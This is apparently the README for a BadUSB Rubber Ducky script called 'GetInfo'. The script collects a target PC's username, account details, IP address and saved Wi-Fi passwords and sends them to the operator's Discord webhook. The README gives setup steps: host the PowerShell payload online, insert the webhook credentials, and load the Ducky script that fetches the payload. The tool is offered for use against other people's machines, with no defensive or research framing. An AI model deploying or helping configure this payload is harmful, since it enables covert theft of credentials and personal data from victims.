# GetInfo - BadUSB Rubber Ducky Script

This BadUSB Rubber Ducky script is designed to quickly gather information from a target's PC and transmit it to your personal Discord server. The script runs for approximately 3 seconds, collecting data such as username, computer name, disk location, account details, OS version, IP address, and previously signed-in Wi-Fi networks with passwords.

## How to Set Up

1. Make a copy of `getinfo.ps1` and host it on an accessible location on the internet, preferably on GitHub.
2. Edit the code at line 43 that specifies "$webhookUrl" with your Discord webhook API credentials.
3. On your BadUSB Rubber Ducky device, install the script from `GetInfo.txt`.
4. Replace `'link-to/getinfo.ps1'` in the script with the custom hosted URL of your `.ps1` file.

## How to Set Up a Discord Webhook API

1. Create a Discord server.
2. Navigate to server settings > under apps, go to integrations > click the "View Webhooks" button.
3. Create a webhook.
4. Copy the webhook credentials and paste them into the new `.ps1` file.

By following these steps, you can deploy and customize the GetInfo script for your specific use case, securely transmitting gathered information to your Discord server.
